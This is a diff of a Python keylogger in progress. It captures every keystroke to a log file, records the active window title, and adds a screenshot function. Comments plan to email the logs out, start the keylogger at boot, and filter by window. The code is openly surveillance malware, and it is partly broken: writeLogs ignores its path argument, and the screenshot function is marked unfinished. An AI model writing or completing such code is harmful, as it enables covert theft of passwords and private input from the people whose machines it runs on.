@@ -4,6 +4,7 @@ import listener
 import random
 import time
 import os
+import pyautogui
 
 chars = 0
 data = []
@@ -26,19 +27,18 @@ def on_press(key):
     else:
         data.append(keyPressed)
 
-    print("".join(data))
-    writeLogs(0)
+    print("".join(data)) # debug statement to see chars
+    writeLogs(os.path.expandvars("%tmp%"))
 
 
-def writeLogs(chars):
-    path = os.path.expandvars("temp")
+def writeLogs(path):
+    #path = os.path.expandvars("%tmp%")
     with open(fileName, "a") as f:
         #new_data = [item.strip("'") for item in data]
         f.write(''.join(data))
         f.close()
 
 def appListener():
-    time.sleep(10)
     appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
     if appOpen == "Cortana":
         appOpen = "Windows Start Menu"
@@ -46,8 +46,13 @@ def appListener():
     else:
         pass
 
+def takeScreenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save("screen.png")
+    #to finish this
+
+
+
 # add a function to send the logs via email
-# add a function to encrypt and decrypt logs
 # startup keylogger
-# screen logger
 # possibly adding a window filter 
